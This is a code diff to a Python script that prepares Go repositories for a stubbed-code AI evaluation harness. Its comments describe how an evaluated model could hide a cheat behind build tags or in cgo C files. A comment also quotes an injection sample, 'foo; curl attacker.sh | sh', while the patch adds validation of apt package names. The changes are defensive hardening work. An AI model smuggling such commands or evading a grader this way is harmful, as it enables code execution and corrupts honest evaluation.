@@ -205,10 +205,54 @@ def create_stubbed_branch(
     git(repo_dir, "checkout", "-b", branch_name)
 
     logger.info("  Running gostubber on %s...", repo_dir.name)
+
+    # N25/N26: warn on Go features the stub/eval pipeline doesn't model.
+    #   Build tags (`//go:build tag` / legacy `// +build tag`): a model could
+    #     hide a cheat behind a rare build tag; the stubber processes files as
+    #     the compiler sees the DEFAULT tag set, so an alternate-tag file is
+    #     invisible to stubbing (and to canonical inventory).
+    #   cgo (`import "C"`): the stubber only touches .go, so a .c/.h/.cc file
+    #     alongside a cgo import block can carry the real impl unstubbed.
+    _build_tagged: list[str] = []
+    _cgo_files: list[str] = []
+    for _pre in repo_dir.rglob("*.go"):
+        try:
+            _rel = _pre.relative_to(repo_dir)
+            if any(p in {"vendor", ".git", "testdata", "internal"} for p in _rel.parts):
+                continue
+            head = _pre.read_text(errors="replace").splitlines()[:30]
+            for ln in head:
+                s = ln.strip()
+                if s.startswith("//go:build") or s.startswith("// +build"):
+                    _build_tagged.append(str(_rel))
+                    break
+                if s.startswith("import \"C\"") or s == 'import "C"':
+                    _cgo_files.append(str(_rel))
+                    break
+        except OSError:
+            continue
+    if _build_tagged:
+        logger.warning(
+            "  Build-tag-gated files present (%d) — stubbing sees only the default tag set, "
+            "any alternate-tag impl is invisible to the harness: %s%s",
+            len(_build_tagged), _build_tagged[:5],
+            " ..." if len(_build_tagged) > 5 else "",
+        )
+    if _cgo_files:
+        logger.warning(
+            "  cgo files present (%d) — .c/.h/.cc alongside these carry impl the "
+            "stubber cannot touch; do not onboard cgo repos without a review: %s%s",
+            len(_cgo_files), _cgo_files[:5],
+            " ..." if len(_cgo_files) > 5 else "",
+        )
     stubbed_count = 0
     for go_file in repo_dir.rglob("*.go"):
         rel = go_file.relative_to(repo_dir)
-        if any(p in {"vendor", ".git", "testdata"} for p in rel.parts):
+        # N2: `internal` skipped for parity with tools/stub_go.SKIP_DIRS and
+        # tools/discover_go.SKIP_DIRS. Go's internal/ is a language-enforced
+        # import boundary; keeping it out of the scored surface makes the eval
+        # scope match the inventory scope (both exclude internal helpers).
+        if any(p in {"vendor", ".git", "testdata", "internal"} for p in rel.parts):
             continue
         if go_file.name.endswith("_test.go") or go_file.name == "doc.go":
             continue
@@ -315,11 +359,25 @@ def build_setup_dict(repo_dir: Path, go_info: dict, full_name: str) -> dict:
 
     apt_deps_file = repo_dir / ".apt-packages"
     if apt_deps_file.exists():
-        pre_install = [
-            line.strip()
-            for line in apt_deps_file.read_text().splitlines()
-            if line.strip() and not line.startswith("#")
-        ]
+        # N3 (shell-injection close): `.apt-packages` values are dropped straight
+        # into the setup script that later runs `apt-get install $pkg` in the
+        # container-build path. A repo (or poisoned dataset row) with a token
+        # like `foo; curl attacker.sh | sh` previously got command execution.
+        # Enforce a strict apt-package-name shape: leading alnum, then alnum /
+        # . / + / - / _ / : (per Debian policy §5.6.7). Reject anything else.
+        import re as _re
+        _APT_PKG_RE = _re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9+._\-]*(?::[a-zA-Z0-9+._\-]+)?$")
+        pre_install = []
+        for line in apt_deps_file.read_text().splitlines():
+            tok = line.strip()
+            if not tok or tok.startswith("#"):
+                continue
+            if not _APT_PKG_RE.match(tok):
+                raise ValueError(
+                    f"Refusing to build setup script: unsafe .apt-packages token "
+                    f"{tok!r} in {apt_deps_file} — must be a valid Debian package name."
+                )
+            pre_install.append(tok)
 
     spec_url = _find_docs_url(go_info.get("module_path", ""))
 
@@ -681,7 +739,7 @@ def main() -> None:
     parser.add_argument(
         "--output",
         type=str,
-        default="dataset_entries.json",
+        default="dataset_entries_go.json",
         help="Output JSON file (default: dataset_entries.json)",
     )
     parser.add_argument(
@@ -825,6 +883,13 @@ def main() -> None:
         logger.info("Generated config: %s", _cfg)
     except Exception as _cfg_err:  # noqa: BLE001 - best-effort
         logger.warning("commit0-go config generation failed: %s", _cfg_err)
+
+    # Exit non-zero when nothing was prepared so batch drivers / CI keying on the
+    # exit code don't treat a total prepare failure as success (parity with the
+    # other prepare_repo_*.py scripts).
+    if not entries:
+        logger.error("Prepared 0 entries — nothing to build. Exiting non-zero.")
+        sys.exit(1)
 
 
 if __name__ == "__main__":
